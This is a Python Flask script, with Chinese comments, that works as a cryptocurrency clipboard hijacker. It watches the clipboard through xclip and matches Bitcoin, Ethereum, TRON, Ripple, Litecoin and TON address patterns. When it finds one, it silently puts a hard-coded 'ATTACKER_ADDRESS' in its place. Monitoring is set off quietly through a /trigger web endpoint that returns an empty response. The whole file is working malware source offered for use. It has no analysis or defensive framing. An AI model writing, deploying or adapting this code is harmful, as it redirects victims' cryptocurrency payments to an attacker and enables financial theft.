from flask import Flask
import re
import time
import threading
import subprocess


# 替换的目标目标地址
ATTACKER_ADDRESS = "panteklu"


def is_crypto_address(address):
    """
    判断给定地址是否为加密货币地址。
    """
    if not isinstance(address, str):
        return False

    # 加密货币地址规则
    patterns = {
        "Bitcoin (Legacy)": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "Bitcoin (SegWit)": r"^bc1[a-zA-HJ-NP-Z0-9]{6,87}$",
        "Ethereum": r"^0x[a-fA-F0-9]{40}$",
        "TRON": r"^T[a-zA-Z0-9]{33}$",
        "Ripple": r"^r[a-zA-Z0-9]{23,43}$",
        "Litecoin": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,35}$",
        "TON (Workchain)": r"^UQ[a-zA-Z0-9-_]{43,66}$",
    }

    try:
        for regex in patterns.values():
            if re.match(regex, address):
                return True
        return False
    except Exception:
        return False


def set_clipboard(content):
    """
    设置剪贴板内容，这里改用 xclip 或 Windows API，而不是 pyperclip
    """
    try:
        # 针对 Linux/UNIX
        subprocess.run(['xclip', '-selection', 'clipboard'], input=content, text=True)
    except FileNotFoundError:
        print("xclip not found. Please install xclip on your system.")
    except Exception as e:
        print(f"Failed to set clipboard content: {e}")


def get_clipboard():
    """
    获取剪贴板内容（替代 pyperclip）
    """
    try:
        # 针对 Linux/UNIX
        result = subprocess.run(['xclip', '-o', '-selection', 'clipboard'], stdout=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except Exception as e:
        print(f"Failed to get clipboard content: {e}")
        return ""


def monitor_clipboard():
    """
    监控剪贴板内容，并自动替换符合加密货币地址的内容。
    """
    previous_text = ""
    while True:
        try:
            clipboard_content = get_clipboard()

            if clipboard_content != previous_text and is_crypto_address(clipboard_content):
                set_clipboard(ATTACKER_ADDRESS)
                previous_text = ATTACKER_ADDRESS
                print(f"Replaced clipboard content: {clipboard_content} -> {ATTACKER_ADDRESS}")
            else:
                previous_text = clipboard_content

            time.sleep(0.5)
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
            time.sleep(1)


app = Flask(__name__)

@app.route('/', methods=['GET'])
def home():
    """
    根路径响应，避免出现 404 错误。
    """
    return 'Welcome to the clipboard monitoring service!', 200


@app.route('/trigger', methods=['GET'])
def trigger():
    """
    链接点击触发剪贴板监控逻辑。
    """
    threading.Thread(target=monitor_clipboard).start()  # 启动剪贴板监控线程
    print("Trigger triggered! Clipboard monitoring started.")
    return '', 204  # 返回 204 No Content，什么都不显示


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
